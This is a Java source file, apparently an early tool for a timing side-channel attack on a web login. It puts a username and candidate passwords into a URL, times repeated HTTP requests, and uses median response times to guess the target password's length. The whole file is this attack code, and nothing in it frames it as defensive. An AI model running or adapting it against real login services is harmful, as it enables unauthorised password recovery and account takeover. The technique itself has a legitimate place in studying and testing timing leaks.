package timer;

import org.apache.commons.httpclient.DefaultHttpMethodRetryHandler;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.commons.lang3.StringUtils;

import java.util.Arrays;

/**
 * Created by tomgond on 4/16/2017.
 */
public class URLTimer {

    private String url;
    private String user;
    private HttpClient client = new HttpClient();


    public URLTimer(String url, String user){
        this.url = url.replace("{user}", user);
        this.user = user;
    }

    public long TestPassword(String pass){
        String sent_string = url.replace("{password}", pass);
        long res = TimedHttpRequest(sent_string);
        System.out.println("Tested : " + pass + " Time = " + Long.toString(res));
        return res;
    }

    private long findMedian(long[] numArray){
        Arrays.sort(numArray);
        long median;
        if (numArray.length % 2 == 0)
            median = ((long)numArray[numArray.length/2] + (long)numArray[numArray.length/2 - 1])/2;
        else
            median = (long) numArray[numArray.length/2];
        return median;
    }

    private long[] sampleMultiple(String password, int times){
        long[] arr = new long[times];
        for (int i=0; i<times; i++){
            arr[i] = TestPassword(password);
        }
        return arr;
    }

    private long getMedianOfPassword(String password, int times){
        return findMedian(sampleMultiple(password, times));
    }

    public int findLength(){
        long min = 0;
        int length = 99999;
        for (int i = 0; i<32; i++){
            long med = getMedianOfPassword(StringUtils.repeat("a", i), 10);
            if (med > min){
                min = med;
                length = i;
            }
        }
        return length;
    }


    private long TimedHttpRequest(String url) {
        long finish=999999999;
        long start=0;
        try {
            GetMethod get = new GetMethod(url);
            get.getParams().setParameter(HttpMethodParams.RETRY_HANDLER,
                    new DefaultHttpMethodRetryHandler(3, false));
            start = System.currentTimeMillis();
            int statusCode = client.executeMethod(get);
            String res = get.getResponseBodyAsString();
            finish = System.currentTimeMillis();
            get.releaseConnection();
        }
        catch (Exception e){
            System.out.println("Had error : " + e.toString());
        }
        return finish-start;
    }
}
